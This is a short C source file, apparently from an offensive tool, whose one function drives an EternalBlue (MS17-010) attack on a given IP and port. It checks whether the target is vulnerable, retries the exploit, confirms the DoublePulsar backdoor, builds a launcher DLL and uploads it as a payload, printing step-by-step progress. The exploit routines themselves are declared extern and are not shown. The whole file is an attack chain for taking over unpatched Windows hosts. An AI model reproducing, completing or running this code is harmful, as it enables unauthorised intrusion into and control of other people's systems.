#include "config.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *binary_path, const char *dll_out_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

int execute_eternalblue(const char *ip, int port, const char *payload_path) {
    printf("Step 1: Checking vulnerability status...\n");
    if (ms17_vuln_status(ip, port) != 0) {
        return -1;
    }

    printf("Step 2: Attempting EternalBlue...\n");
    int retries;
    for (retries = 0; retries < MAX_RETRIES; retries++) {
        if (EternalBlue(ip, port) == 0) {
            break;
        }
    }
    if (retries == MAX_RETRIES) {
        return -2;
    }

    printf("Step 3: Checking DoublePulsar status...\n");
    if (doublepulsar_check(ip, port) != 0) {
        return -3;
    }

    printf("Step 4: Building launcher DLL...\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        return -4;
    }

    printf("Step 5: Uploading payload...\n");
    if (upload_payload(ip, port, PAYLOAD_DLL_PATH, 1) != 0) {
        return -5;
    }

    printf("Success: EternalBlue exploited successfully.\n");
    return 0;
}